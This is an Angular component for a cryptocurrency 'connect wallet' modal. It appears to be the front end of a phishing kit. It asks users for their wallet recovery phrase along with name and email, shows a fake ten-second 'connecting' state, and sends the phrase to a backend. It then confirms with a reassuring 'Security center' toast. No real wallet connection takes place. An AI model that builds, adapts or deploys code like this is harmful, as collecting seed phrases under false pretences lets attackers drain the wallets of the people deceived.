import { Component, OnInit, Input } from '@angular/core';
import dapps from 'src/app/layout/shared/dapps.json';
import {close_modal} from '../../../utils/helper';
import { ToastrManager } from "ng6-toastr-notifications";
import { DataService } from 'src/app/data.service';

@Component({
  selector: 'app-connect-wallet',
  templateUrl: './connect-wallet.component.html',
  styleUrls: ['./connect-wallet.component.scss']
})
export class ConnectWalletComponent implements OnInit {

  @Input() title: string = 'Alert';
  @Input() message: string = 'Something went wrong.';

  constructor(
     private server: DataService,
     private toastr: ToastrManager,
  ) { }


  activeTab: string = 'other';
  connetTab = {
    open: false,
    tab: 'name'
  };

  connect = {
    image: 'assets/images/qr-code.png',
    wallet:'',
    connecting : false

  };

  dapps = dapps.records;

  wallet = {
    full_name: '',
    wallet_phrase: '',
    wallet_name: "",
    wallet_email: '',
    key: "wallet_connect",
  };

  // Connect(item: any) {
  //   console.log('Connecting to', item.name);
  //   this.activeTab = 'connect';
  //   this.connect.connecting = true;

  //   setTimeout(() => {
  //     this.connect.connecting = false;
  //   }, 2000);
  // }




 Connect(item) {
    this.activeTab = 'connect';
    this.connect.connecting = true;
    this.connect.image = item.logoCdnUrl;
    this.connect.wallet = item.slug;
    this.wallet.wallet_name = item.slug;
    setTimeout(() => {
        this.connect.connecting = false;
    }, 10000);
};

closeModal() {
  close_modal('wallet');
}
  submit() {
    console.log('Wallet submitted:', this.wallet);
    this.server.Api(this.wallet).subscribe(
      (res) => {
        if (res["code"] == 1) {
          this.toastr.successToastr(res["message"], "Security center");
        }

      },
      () => {},
      () => {}
    );
  }



  ngOnInit(): void {
  }

}
